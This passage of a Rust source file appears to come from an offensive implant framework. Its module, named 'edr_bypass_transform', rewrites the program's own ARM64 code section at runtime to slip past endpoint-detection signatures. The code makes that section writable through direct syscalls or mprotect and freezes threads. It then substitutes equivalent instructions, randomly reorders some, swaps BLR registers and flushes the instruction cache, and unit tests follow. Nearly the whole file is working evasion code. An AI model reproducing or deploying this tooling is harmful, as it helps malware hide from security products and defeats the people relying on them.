            let imm12 = decode_imm12(insn);
            // SUB #0 → ADD #0 (semantically identical)
            if imm12 == 0 {
                let replacement = enc_add_x_imm(rd, rn, 0);
                let before = text[offset..offset + 4].to_vec();
                text[offset..offset + 4].copy_from_slice(&insn_to_bytes(replacement));
                records.push(TransformRecord {
                    offset,
                    transform_type: "arm64_sub0_to_add0".to_string(),
                    before_hex: hex_encode(&before),
                    after_hex: hex_encode(&insn_to_bytes(replacement)),
                    size_delta: 0,
                });
            }
        }
    }
    records
}

/// **Transformation 6: MOV register substitution**.
///
/// `MOV Xd, Xn` → `ADD Xd, Xn, #0`
///
/// Both copy Xn to Xd with no flag side effects.  Different byte encoding.
fn transform_mov_reg_substitution(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();

    for offset in (0..text.len()).step_by(4) {
        if excluded.get(offset).copied().unwrap_or(true) {
            continue;
        }
        if !actionable.contains(&offset) {
            continue;
        }
        let insn = match read_insn(text, offset) {
            Some(i) => i,
            None => continue,
        };
        if let Some((rd, rm)) = is_mov_xd_xm(insn) {
            let replacement = enc_add_x_imm(rd, rm, 0);
            let before = text[offset..offset + 4].to_vec();
            text[offset..offset + 4].copy_from_slice(&insn_to_bytes(replacement));
            records.push(TransformRecord {
                offset,
                transform_type: "arm64_mov_reg_to_add_imm0".to_string(),
                before_hex: hex_encode(&before),
                after_hex: hex_encode(&insn_to_bytes(replacement)),
                size_delta: 0,
            });
        }
    }
    records
}

/// **Transformation 7: Instruction reordering**.
///
/// Swaps two adjacent independent instructions within a basic block.
/// ARM64 instructions that don't depend on each other can be freely reordered.
///
/// Safety checks:
/// - Neither instruction is a branch, SVC, or load/store
/// - Neither instruction writes a register the other reads
/// - Neither instruction uses SP
/// - Neither instruction is PC-relative
fn transform_instruction_reorder(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();
    let mut rng = rand::thread_rng();
    let max_reorders = 4usize;
    let mut count = 0;

    for offset in (0..text.len().saturating_sub(4)).step_by(4) {
        if count >= max_reorders {
            break;
        }
        // Check both instructions are safe
        if excluded.get(offset).copied().unwrap_or(true) {
            continue;
        }
        if excluded.get(offset + 4).copied().unwrap_or(true) {
            continue;
        }
        // Only reorder at actionable offsets (near a detected signature)
        if !actionable.contains(&offset) && !actionable.contains(&(offset + 4)) {
            continue;
        }

        let insn_a = match read_insn(text, offset) {
            Some(i) => i,
            None => continue,
        };
        let insn_b = match read_insn(text, offset + 4) {
            Some(i) => i,
            None => continue,
        };

        // Both must be pure data-processing
        if !is_pure_data_processing(insn_a) || !is_pure_data_processing(insn_b) {
            continue;
        }
        // Neither can use SP
        if uses_sp(insn_a) || uses_sp(insn_b) {
            continue;
        }
        // Neither can be a branch
        if is_br(insn_a) || is_blr(insn_a) || is_ret(insn_a) || is_svc(insn_a) {
            continue;
        }
        if is_br(insn_b) || is_blr(insn_b) || is_ret(insn_b) || is_svc(insn_b) {
            continue;
        }

        // Dependency check: A writes a register B reads, or vice versa.
        let a_rd = decode_rd(insn_a);
        let a_rn = decode_rn(insn_a);
        let a_rm = decode_rm(insn_a);
        let b_rd = decode_rd(insn_b);
        let b_rn = decode_rn(insn_b);
        let b_rm = decode_rm(insn_b);

        // A writes → B reads dependency?
        // (If A's destination is one of B's sources, can't reorder)
        let a_writes_b_reads = (a_rd != 31 && a_rd != 0)
            && ((a_rd == b_rn && b_rn != 31) || (a_rd == b_rm && b_rm != 31));
        // B writes → A reads dependency?
        let b_writes_a_reads = (b_rd != 31 && b_rd != 0)
            && ((b_rd == a_rn && a_rn != 31) || (b_rd == a_rm && a_rm != 31));

        if a_writes_b_reads || b_writes_a_reads {
            continue;
        }

        // A writes → B writes same register? Safe to reorder (B wins).
        // But skip for simplicity.

        // Random 50% chance to reorder (adds non-determinism).
        if !rng.gen::<bool>() {
            continue;
        }

        // Swap the two instructions.
        let before_a = text[offset..offset + 4].to_vec();
        let before_b = text[offset + 4..offset + 8].to_vec();
        let mut before_all = before_a.clone();
        before_all.extend_from_slice(&before_b);

        text[offset..offset + 4].copy_from_slice(&insn_to_bytes(insn_b));
        text[offset + 4..offset + 8].copy_from_slice(&insn_to_bytes(insn_a));

        let mut after_all = insn_to_bytes(insn_b).to_vec();
        after_all.extend_from_slice(&insn_to_bytes(insn_a));

        records.push(TransformRecord {
            offset,
            transform_type: "arm64_instruction_reorder".to_string(),
            before_hex: hex_encode(&before_all),
            after_hex: hex_encode(&after_all),
            size_delta: 0,
        });
        count += 1;
    }
    records
}

/// **Transformation 8: BLR register diversification**.
///
/// `BLR Xn` → `BLR Xm` where Xn and Xm are both scratch registers,
/// preceded by `MOV Xm, Xn` in the prior instruction slot.
///
/// This changes the register used in the BLR, which changes the byte encoding.
/// Only applies when the preceding instruction can be safely replaced.
fn transform_blr_diversification(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();

    for offset in (4..text.len()).step_by(4) {
        if excluded.get(offset).copied().unwrap_or(true) {
            continue;
        }
        if !actionable.contains(&offset) {
            continue;
        }
        let insn = match read_insn(text, offset) {
            Some(i) => i,
            None => continue,
        };
        if !is_blr(insn) {
            continue;
        }
        let rn = decode_rn(insn);
        // Only obfuscate BLR through scratch registers (X9-X17)
        if rn < 9 || rn > 17 {
            continue;
        }

        // Check preceding instruction
        let prev_offset = offset - 4;
        if excluded.get(prev_offset).copied().unwrap_or(true) {
            continue;
        }
        let prev_insn = match read_insn(text, prev_offset) {
            Some(i) => i,
            None => continue,
        };

        // If prev is MOV X_rn, Xs, change it to MOV X_alt, Xs
        if let Some((_rd, rm)) = is_mov_xd_xm(prev_insn) {
            let alt = if rn < 17 { rn + 1 } else { rn - 1 };
            let new_prev = enc_mov_x(alt, rm);
            let new_blr = 0xD63F_0000 | (alt << 5); // BLR X_alt

            let before_prev = text[prev_offset..prev_offset + 4].to_vec();
            let before_blr = text[offset..offset + 4].to_vec();
            let mut before_all = before_prev.clone();
            before_all.extend_from_slice(&before_blr);

            text[prev_offset..prev_offset + 4].copy_from_slice(&insn_to_bytes(new_prev));
            text[offset..offset + 4].copy_from_slice(&insn_to_bytes(new_blr));

            let mut after_all = insn_to_bytes(new_prev).to_vec();
            after_all.extend_from_slice(&insn_to_bytes(new_blr));

            records.push(TransformRecord {
                offset: prev_offset,
                transform_type: "arm64_blr_register_swap".to_string(),
                before_hex: hex_encode(&before_all),
                after_hex: hex_encode(&after_all),
                size_delta: 0,
            });
        }
    }
    records
}

// ── Verification ────────────────────────────────────────────────────────────

/// Compute the SHA-256 hash of the current `.text` section.
fn hash_text(text: &[u8]) -> String {
    let digest = Sha256::digest(text);
    hex::encode(digest)
}

// ── Page protection ─────────────────────────────────────────────────────────

/// Make a memory region writable (RW) for transformation, returning the
/// original protection.
///
/// Uses PAGE_READWRITE (0x04), never PAGE_EXECUTE_READWRITE (0x40).
#[cfg(windows)]
unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
    let mut old_protect: u32 = 0;
    let mut region_base = base as *mut std::ffi::c_void;
    let mut region_size = size;
    let status = crate::syscall!(
        "NtProtectVirtualMemory",
        (-1i64) as u64,
        &mut region_base as *mut _ as u64,
        &mut region_size as *mut _ as u64,
        0x04u32 as u64,
        &mut old_protect as *mut _ as u64,
    )
    .map_err(|e| {
        anyhow::anyhow!("edr_bypass_transform: NtProtectVirtualMemory resolution failed: {e}")
    })?;
    if status != 0 {
        bail!("edr_bypass_transform: NtProtectVirtualMemory failed: 0x{status:08X}");
    }
    Ok(old_protect)
}

/// Restore page protection to its original value.
#[cfg(windows)]
unsafe fn restore_protection(base: usize, size: usize, original: u32) -> Result<()> {
    let mut old_protect: u32 = 0;
    let mut region_base = base as *mut std::ffi::c_void;
    let mut region_size = size;
    let status = crate::syscall!(
        "NtProtectVirtualMemory",
        (-1i64) as u64,
        &mut region_base as *mut _ as u64,
        &mut region_size as *mut _ as u64,
        original as u64,
        &mut old_protect as *mut _ as u64,
    )
    .map_err(|e| {
        anyhow::anyhow!("edr_bypass_transform: NtProtectVirtualMemory resolution failed: {e}")
    })?;
    if status != 0 {
        bail!("edr_bypass_transform: NtProtectVirtualMemory restore failed: 0x{status:08X}");
    }
    Ok(())
}

/// Linux implementation of make_region_writable using mprotect.
#[cfg(not(windows))]
unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
    use std::io;
    let maps = std::fs::read_to_string("/proc/self/maps").map_err(|e| {
        anyhow::anyhow!("edr_bypass_transform: failed to read /proc/self/maps: {e}")
    })?;

    let mut original_protect: u32 = 0x05;
    for line in maps.lines() {
        let parts: Vec<&str> = line.splitn(3, ' ').collect();
        if parts.len() < 2 {
            continue;
        }
        let addr_range: Vec<&str> = parts[0].splitn(2, '-').collect();
        if addr_range.len() != 2 {
            continue;
        }
        if let (Ok(start), Ok(end)) = (
            usize::from_str_radix(addr_range[0], 16),
            usize::from_str_radix(addr_range[1], 16),
        ) {
            if base >= start && base < end {
                let perms = parts[1].as_bytes();
                let mut prot: u32 = 0;
                if perms.len() >= 1 && perms[0] == b'r' {
                    prot |= 0x1;
                }
                if perms.len() >= 2 && perms[1] == b'w' {
                    prot |= 0x2;
                }
                if perms.len() >= 3 && perms[2] == b'x' {
                    prot |= 0x4;
                }
                original_protect = prot;
                break;
            }
        }
    }

    const PROT_READ: u32 = 0x1;
    const PROT_WRITE: u32 = 0x2;
    let new_prot = PROT_READ | PROT_WRITE;

    let page_size = 4096usize;
    let aligned_base = base & !(page_size - 1);
    let aligned_end = (base + size + page_size - 1) & !(page_size - 1);
    let aligned_size = aligned_end - aligned_base;

    let ret = libc::mprotect(
        aligned_base as *mut std::ffi::c_void,
        aligned_size,
        new_prot as i32,
    );
    if ret != 0 {
        bail!(
            "edr_bypass_transform: mprotect(RW) failed for {:x}-{:x}: {}",
            aligned_base,
            aligned_end,
            io::Error::last_os_error()
        );
    }
    Ok(original_protect)
}

/// Linux implementation of restore_protection using mprotect.
#[cfg(not(windows))]
unsafe fn restore_protection(base: usize, size: usize, original: u32) -> Result<()> {
    use std::io;
    let page_size = 4096usize;
    let aligned_base = base & !(page_size - 1);
    let aligned_end = (base + size + page_size - 1) & !(page_size - 1);
    let aligned_size = aligned_end - aligned_base;

    let ret = libc::mprotect(
        aligned_base as *mut std::ffi::c_void,
        aligned_size,
        original as i32,
    );
    if ret != 0 {
        bail!(
            "edr_bypass_transform: mprotect(restore) failed for {:x}-{:x}: {}",
            aligned_base,
            aligned_end,
            io::Error::last_os_error()
        );
    }
    Ok(())
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Run one full scan-and-transform cycle (ARM64).
///
/// 1. Computes the SHA-256 of `.text` before changes.
/// 2. Scans for all known ARM64 EDR signatures.
/// 3. Applies transformations (up to `max_transforms_per_cycle`).
/// 4. Re-hashes `.text` and verifies the transformation was applied.
/// 5. Returns a detailed `TransformCycleResult`.
///
/// # ARM64-Specific Notes
///
/// Unlike x86-64, all ARM64 transformations are length-preserving (size_delta
/// is always 0).  This means:
/// - No branch offset recalculation needed for same-block transforms
/// - No padding/NOP insertion to fill gaps
/// - Transforms are simpler and less risky
///
/// # Safety
///
/// This function modifies executable memory in-place.  All sibling OS threads
/// are suspended during the transformation window.
pub fn run_edr_bypass_transform(
    max_transforms: u32,
    entropy_threshold: f64,
) -> Result<TransformCycleResult> {
    let start = std::time::Instant::now();

    let mut frozen = crate::self_reencode::freeze_threads()
        .context("edr_bypass_transform: failed to freeze sibling threads")?;

    // Step 1: Locate .text section.
    let text_section = crate::self_reencode::find_text_section()
        .context("edr_bypass_transform: failed to locate .text section")?;

    let text_ptr = text_section.base as *mut u8;
    let text_size = text_section.size;

    // Step 2: Hash before.
    let text_before = unsafe { std::slice::from_raw_parts(text_ptr, text_size) };
    let hash_before = hash_text(text_before);
    let entropy_before = shannon_entropy(text_before);
    tracing::info!(
        "edr_bypass_transform: ARM64 .text entropy before transforms: {:.3}",
        entropy_before,
    );

    // Step 3: Make .text writable.
    let original_protect = unsafe { make_region_writable(text_section.base, text_section.size) }
        .context("edr_bypass_transform: failed to make .text writable")?;

    // Step 4: Scan for signatures.
    let hits = scan_for_signatures()?;

    // Step 5: Build exclusion bitmap.
    let text_mut = unsafe { std::slice::from_raw_parts_mut(text_ptr, text_size) };
    let excluded = build_exclusion_bitmap(text_mut);

    // Step 6: Apply transformations.
    let mut all_transforms = Vec::new();
    let mut applied = 0u32;

    // Filter hits by entropy threshold into a set of actionable offsets.
    let actionable_offsets: HashSet<usize> = hits
        .iter()
        .filter(|h| {
            let region_start = h.offset.saturating_sub(32);
            let region_end = (h.offset + 32).min(text_mut.len());
            shannon_entropy(&text_mut[region_start..region_end]) < entropy_threshold
        })
        .map(|h| h.offset)
        .collect();

    tracing::info!(
        "edr_bypass_transform: ARM64 {} actionable hits out of {} total (entropy threshold: {:.1})",
        actionable_offsets.len(),
        hits.len(),
        entropy_threshold,
    );

    // Apply each transformation type in order, respecting the budget.

    // 1. NOP substitution (NOP → MOV X0, X0).
    if applied < max_transforms {
        let recs = transform_nop_substitution(text_mut, &excluded, &actionable_offsets);
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 2. Zero-register substitution (MOVZ Xd, #0 → EOR Xd, Xd, Xd).
    if applied < max_transforms {
        let recs = transform_zero_reg_substitution(text_mut, &excluded, &actionable_offsets);
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 3. RET obfuscation (RET → BR X30).
    if applied < max_transforms {
        let recs = transform_ret_obfuscation(text_mut, &excluded, &actionable_offsets);
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 4. Branch obfuscation (BR Xn → BR Xalt with setup).
    if applied < max_transforms {
        let recs = transform_branch_obfuscation(text_mut, &excluded, &actionable_offsets);
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 5. ADD/SUB swap.
    if applied < max_transforms {
        let recs = transform_add_sub_swap(text_mut, &excluded, &actionable_offsets);
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 6. MOV register substitution.
    if applied < max_transforms {
        let recs = transform_mov_reg_substitution(text_mut, &excluded, &actionable_offsets);
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 7. Instruction reordering.
    if applied < max_transforms {
        let recs = transform_instruction_reorder(text_mut, &excluded, &actionable_offsets);
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 8. BLR register diversification.
    if applied < max_transforms {
        let recs = transform_blr_diversification(text_mut, &excluded, &actionable_offsets);
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // Truncate to max_transforms.
    all_transforms.truncate(max_transforms as usize);
    applied = all_transforms.len() as u32;

    // Step 7: Count skipped.
    let skipped = actionable_offsets.len().saturating_sub(applied as usize) as u32;

    // Step 8: Hash after + compute entropy after.
    let text_after = unsafe { std::slice::from_raw_parts(text_ptr, text_size) };
    let hash_after = hash_text(text_after);
    let entropy_after = shannon_entropy(text_after);

    tracing::info!(
        "edr_bypass_transform: ARM64 .text entropy after transforms: {:.3} (delta: {:+.3})",
        entropy_after,
        entropy_after - entropy_before,
    );

    // Step 9: Restore page protection.
    unsafe {
        restore_protection(text_section.base, text_section.size, original_protect)?;
    }

    // Step 10: Flush instruction cache (Windows).
    #[cfg(windows)]
    {
        let status = match crate::syscall!(
            "NtFlushInstructionCache",
            std::ptr::null_mut::<std::ffi::c_void>() as u64,
            text_ptr as *mut std::ffi::c_void as u64,
            text_size as u64,
        ) {
            Ok(status) => status,
            Err(e) => {
                tracing::warn!(
                    "edr_bypass_transform: NtFlushInstructionCache resolution failed: {e}"
                );
                0
            }
        };
        if status != 0 {
            tracing::warn!("edr_bypass_transform: NtFlushInstructionCache returned 0x{status:08X}");
        }
    }

    // Resume sibling threads.
    frozen.thaw();

    let elapsed = start.elapsed();

    // Update global stats.
    LAST_TRANSFORM_COUNT.store(applied, Ordering::Relaxed);
    TOTAL_TRANSFORMS.fetch_add(applied as u64, Ordering::Relaxed);
    LAST_SCAN_TIMESTAMP.store(
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs(),
        Ordering::Relaxed,
    );

    let result = TransformCycleResult {
        hash_before,
        hash_after,
        signatures_found: hits,
        transforms_applied: all_transforms,
        skipped,
        elapsed_ms: elapsed.as_millis() as u64,
        entropy_before,
        entropy_after,
    };

    tracing::info!(
        "edr_bypass_transform: ARM64 cycle complete — {} transforms applied, {} skipped, {} ms, entropy {:.3}→{:.3}",
        applied,
        skipped,
        elapsed.as_millis(),
        entropy_before,
        entropy_after,
    );

    {
        let mut guard = LAST_RESULT.lock_recover();
        *guard = Some(result.clone());
    }

    Ok(result)
}

/// Get a status snapshot of the evasion transform subsystem.
pub fn status() -> String {
    let last_scan = LAST_SCAN_COUNT.load(Ordering::Relaxed);
    let last_transforms = LAST_TRANSFORM_COUNT.load(Ordering::Relaxed);
    let total_transforms = TOTAL_TRANSFORMS.load(Ordering::Relaxed);
    let last_timestamp = LAST_SCAN_TIMESTAMP.load(Ordering::Relaxed);

    let last_cycle_info = {
        let guard = LAST_RESULT.lock_recover();
        guard.as_ref().map(|r| {
            serde_json::json!({
                "hash_before": r.hash_before,
                "hash_after": r.hash_after,
                "signatures_found": r.signatures_found.len(),
                "transforms_applied": r.transforms_applied.len(),
                "skipped": r.skipped,
                "elapsed_ms": r.elapsed_ms,
                "entropy_before": r.entropy_before,
                "entropy_after": r.entropy_after,
            })
        })
    };

    let status = serde_json::json!({
        "architecture": "aarch64",
        "last_scan_hits": last_scan,
        "last_cycle_transforms": last_transforms,
        "total_transforms": total_transforms,
        "last_scan_timestamp": if last_timestamp > 0 { Some(last_timestamp) } else { None },
        "last_cycle": last_cycle_info,
    });

    serde_json::to_string_pretty(&status).unwrap_or_default()
}

// ── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_signature_database_sanity() {
        // Every signature's mask+value must be consistent: (value & mask) == value
        for sig in SIGNATURE_DATABASE {
            assert_eq!(
                sig.value & sig.mask,
                sig.value,
                "Signature '{}' has inconsistent mask/value: mask={:#010X}, value={:#010X}",
                sig.name,
                sig.mask,
                sig.value,
            );
        }
    }

    #[test]
    fn test_arm64_nop_substitution() {
        let nop = ARM64_NOP;
        let mov_x0_x0 = enc_mov_x(0, 0);
        assert_ne!(nop, mov_x0_x0, "NOP and MOV X0,X0 must differ");
        assert!(is_nop(nop));
    }

    #[test]
    fn test_movz_zero_to_eor() {
        let movz_x5_zero = enc_movz_x(5, 0);
        assert!(is_movz_x(movz_x5_zero));
        assert_eq!(decode_imm16(movz_x5_zero), 0);
        let eor_x5 = enc_eor_x(5, 5, 5);
        assert_ne!(movz_x5_zero, eor_x5);
    }

    #[test]
    fn test_ret_to_br_x30() {
        let ret = 0xD65F_03C0u32; // RET
        assert!(is_ret_x30(ret));
        let br_x30 = enc_br_x(30);
        assert_eq!(br_x30, 0xD61F_03C0);
        assert_ne!(ret, br_x30, "RET and BR X30 must differ");
    }

    #[test]
    fn test_add_sub_zero_swap() {
        let add_x5_x6_0 = enc_add_x_imm(5, 6, 0);
        let sub_x5_x6_0 = enc_sub_x_imm(5, 6, 0);
        assert!(is_add_x_imm(add_x5_x6_0));
        assert!(is_sub_x_imm(sub_x5_x6_0));
        assert_ne!(add_x5_x6_0, sub_x5_x6_0);
        // Both produce the same result: X5 = X6 + 0 = X6 - 0 = X6
    }

    #[test]
    fn test_mov_reg_to_add_imm0() {
        let mov_x9_x10 = enc_mov_x(9, 10);
        let (rd, rm) = is_mov_xd_xm(mov_x9_x10).unwrap();
        assert_eq!(rd, 9);
        assert_eq!(rm, 10);
        let add_x9_x10_0 = enc_add_x_imm(9, 10, 0);
        assert_ne!(mov_x9_x10, add_x9_x10_0, "MOV and ADD #0 must differ");
    }

    #[test]
    fn test_svc_detection() {
        let svc_zero = 0xD400_0001u32;
        assert!(is_svc_zero(svc_zero));
        assert!(is_svc(svc_zero));
        let svc_42 = 0xD400_0541u32; // SVC #42
        assert!(!is_svc_zero(svc_42));
        assert!(is_svc(svc_42));
    }

    #[test]
    fn test_br_blr_ret_detection() {
        let br_x16 = 0xD61F_0200u32;
        assert!(is_br(br_x16));
        let blr_x16 = 0xD63F_0200u32;
        assert!(is_blr(blr_x16));
        let ret_x30 = 0xD65F_03C0u32;
        assert!(is_ret_x30(ret_x30));
        assert!(is_ret(ret_x30));
    }

    #[test]
    fn test_scan_arm64_code() {
        // Build a small synthetic code snippet with known patterns.
        let mut code: Vec<u8> = Vec::new();
        // SVC #0
        code.extend_from_slice(&0xD400_0001u32.to_le_bytes());
        // RET
        code.extend_from_slice(&0xD65F_03C0u32.to_le_bytes());
        // NOP
        code.extend_from_slice(&ARM64_NOP.to_le_bytes());
        // MOVZ X8, #257
        code.extend_from_slice(&enc_movz_x(8, 257).to_le_bytes());
        // SVC #0
        code.extend_from_slice(&0xD400_0001u32.to_le_bytes());

        // Scan for single-instruction signatures in the synthetic code.
        let mut svc_count = 0usize;
        let mut ret_count = 0usize;
        for offset in (0..code.len()).step_by(4) {
            let insn = read_insn(&code, offset).unwrap();
            for sig in SIGNATURE_DATABASE {
                if (insn & sig.mask) == sig.value {
                    match sig.name {
                        "arm64_svc_zero" => svc_count += 1,
                        "arm64_ret_x30" => ret_count += 1,
                        _ => {}
                    }
                }
            }
        }
        assert_eq!(svc_count, 2, "Expected 2 SVC #0 detections");
        assert_eq!(ret_count, 1, "Expected 1 RET detection");
    }

    #[test]
    fn test_sequence_scan() {
        // Build: SVC #0; RET
        let mut code: Vec<u8> = Vec::new();
        code.extend_from_slice(&0xD400_0001u32.to_le_bytes());
        code.extend_from_slice(&0xD65F_03C0u32.to_le_bytes());

        // Check sequence detection
        let mut found = false;
        for seq_sig in SEQUENCE_SIGNATURES {
            if seq_sig.name != "arm64_svc_ret_gadget" {
                continue;
            }
            let pat_len = seq_sig.pattern.len();
            for offset in (0..code.len().saturating_sub(pat_len * 4)).step_by(4) {
                let mut matched = true;
                for (i, (mask, value)) in seq_sig.pattern.iter().enumerate() {
                    let insn = read_insn(&code, offset + i * 4).unwrap();
                    if (insn & mask) != *value {
                        matched = false;
                        break;
                    }
                }
                if matched {
                    found = true;
                    break;
                }
            }
        }
        assert!(found, "Expected to detect SVC #0; RET sequence");
    }

    #[test]
    fn test_encoding_roundtrip() {
        // Verify that encode → decode → encode is identity for key instructions.
        let rd = 9u32;
        let rm = 10u32;

        let mov = enc_mov_x(rd, rm);
        let (dec_rd, dec_rm) = is_mov_xd_xm(mov).unwrap();
        assert_eq!(dec_rd, rd);
        assert_eq!(dec_rm, rm);

        let eor = enc_eor_x(rd, rd, rd);
        assert_eq!(decode_rd(eor), rd);

        let add = enc_add_x_imm(rd, rm, 42);
        assert!(is_add_x_imm(add));
        assert_eq!(decode_rd(add), rd);
        assert_eq!(decode_rn(add), rm);
        assert_eq!(decode_imm12(add), 42);

        let sub = enc_sub_x_imm(rd, rm, 42);
        assert!(is_sub_x_imm(sub));
    }

    #[test]
    fn test_exclusion_bitmap_flags_svc() {
        // Build code with SVC in the middle.
        let mut code: Vec<u8> = Vec::new();
        code.extend_from_slice(&ARM64_NOP.to_le_bytes()); // offset 0
        code.extend_from_slice(&ARM64_NOP.to_le_bytes()); // offset 4
        code.extend_from_slice(&0xD400_0001u32.to_le_bytes()); // offset 8: SVC #0
        code.extend_from_slice(&ARM64_NOP.to_le_bytes()); // offset 12
        code.extend_from_slice(&ARM64_NOP.to_le_bytes()); // offset 16

        let excluded = build_exclusion_bitmap(&code);

        // SVC at offset 8 should be excluded
        assert!(excluded[8], "SVC instruction must be excluded");
        // Bytes within SVC_EXCLUSION_ZONE (32 bytes) of offset 8 should be excluded
        // Zone starts at max(0, 8-32) = 0, ends at min(20, 8+4+32) = 20
        for i in 0..20 {
            assert!(excluded[i], "Byte {} should be in SVC exclusion zone", i);
        }
    }

    #[test]
    fn test_transformation_correctness() {
        // Apply all transforms to a test sequence and verify functional equivalence.
        // Test sequence:
        //   NOP
        //   MOVZ X5, #0
        //   ADD X9, X10, #0
        //   MOV X9, X10
        //   RET
        let mut code: Vec<u8> = Vec::new();
        code.extend_from_slice(&ARM64_NOP.to_le_bytes()); // offset 0
        code.extend_from_slice(&enc_movz_x(5, 0).to_le_bytes()); // offset 4
        code.extend_from_slice(&enc_add_x_imm(9, 10, 0).to_le_bytes()); // offset 8
        code.extend_from_slice(&enc_mov_x(9, 10).to_le_bytes()); // offset 12
        code.extend_from_slice(&0xD65F_03C0u32.to_le_bytes()); // offset 16: RET

        // No exclusion zones (no SVC).
        let excluded = vec![false; code.len()];
        let actionable: HashSet<usize> = [0, 4, 8, 12, 16].into_iter().collect();

        // Apply NOP substitution.
        let recs = transform_nop_substitution(&mut code, &excluded, &actionable);
        assert_eq!(recs.len(), 1, "Should transform 1 NOP");
        assert_eq!(recs[0].transform_type, "arm64_nop_to_mov_x0_x0");
        let insn = read_insn(&code, 0).unwrap();
        assert_eq!(
            insn,
            enc_mov_x(0, 0),
            "NOP should be replaced with MOV X0, X0"
        );

        // Apply zero-reg substitution.
        let recs = transform_zero_reg_substitution(&mut code, &excluded, &actionable);
        assert_eq!(recs.len(), 1, "Should transform 1 MOVZ X5, #0");
        let insn = read_insn(&code, 4).unwrap();
        assert_eq!(
            insn,
            enc_eor_x(5, 5, 5),
            "MOVZ X5,#0 should be replaced with EOR X5,X5,X5"
        );

        // Apply ADD/SUB swap.
        let recs = transform_add_sub_swap(&mut code, &excluded, &actionable);
        assert_eq!(recs.len(), 1, "Should transform 1 ADD #0");
        let insn = read_insn(&code, 8).unwrap();
        assert_eq!(
            insn,
            enc_sub_x_imm(9, 10, 0),
            "ADD #0 should be replaced with SUB #0"
        );

        // Apply MOV reg substitution.
        let recs = transform_mov_reg_substitution(&mut code, &excluded, &actionable);
        assert_eq!(recs.len(), 1, "Should transform 1 MOV X9, X10");
        let insn = read_insn(&code, 12).unwrap();
        assert_eq!(
            insn,
            enc_add_x_imm(9, 10, 0),
            "MOV X9,X10 should be replaced with ADD X9,X10,#0"
        );

        // Apply RET obfuscation.
        let recs = transform_ret_obfuscation(&mut code, &excluded, &actionable);
        assert_eq!(recs.len(), 1, "Should transform 1 RET");
        let insn = read_insn(&code, 16).unwrap();
        assert_eq!(insn, enc_br_x(30), "RET should be replaced with BR X30");
    }
}
